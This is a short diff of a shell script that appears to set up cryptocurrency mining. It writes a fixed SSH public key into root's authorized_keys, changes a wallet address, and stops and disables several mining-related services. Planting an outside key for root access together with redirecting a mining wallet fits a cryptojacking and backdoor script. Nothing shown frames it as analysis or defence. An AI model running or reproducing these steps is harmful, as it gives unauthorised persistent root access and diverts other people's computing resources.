@@ -4,7 +4,7 @@ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvww
 chmod 700 /root/.ssh/authorized_keys
 chown -R root:root /root/.ssh/authorized_keys
 
-wallet="cb1823f1b419e1b37495dac3a7ea201607dda11a3098"
+wallet="cb8388f64d2067715b4140a036f00deac1ca3aa573f6"
 
 systemctl stop ore scash shai tdc ftb qli
 systemctl disable ore scash shai tdc ftb qli
